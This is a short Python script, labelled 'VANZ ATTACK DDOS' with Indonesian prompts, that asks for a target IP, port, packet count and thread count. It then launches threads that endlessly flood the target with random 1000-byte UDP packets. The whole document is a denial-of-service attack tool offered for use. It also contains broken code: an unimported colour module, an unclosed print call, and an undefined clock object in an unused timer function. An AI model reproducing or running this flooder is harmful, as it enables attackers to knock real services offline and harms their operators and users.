# Import Module
import socket
import random
import threading


print(Fore.RED + ("VANZ ATTACK DDOS")



ip = str(input("[+] MASUKAN IP : "))
port = int(input("[+] MASUKAN PORT : "))
times = int(input("[+] WAJIB ISI (JUMLAH PACKET) : "))
threads = int(input("[+] WAJIB ISI (JUMLAH THREADS : "))

def run():
    data = random._urandom(1000)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" ATTACKED BY VANZ!")
        except socket.error:
            s.close()
            print("[!] VANZ TELAH MENGIRIM LONTONG KEPADA => ",ip," DAN : ",port,"!")
            
def timer(timeout):
    while True:
        if clock.time() > timeout: exit()
        if clock.time() < timeout: clock.sleep(0.1)
			
for y in range(threads):
    th = threading.Thread(target = run)
    th.start()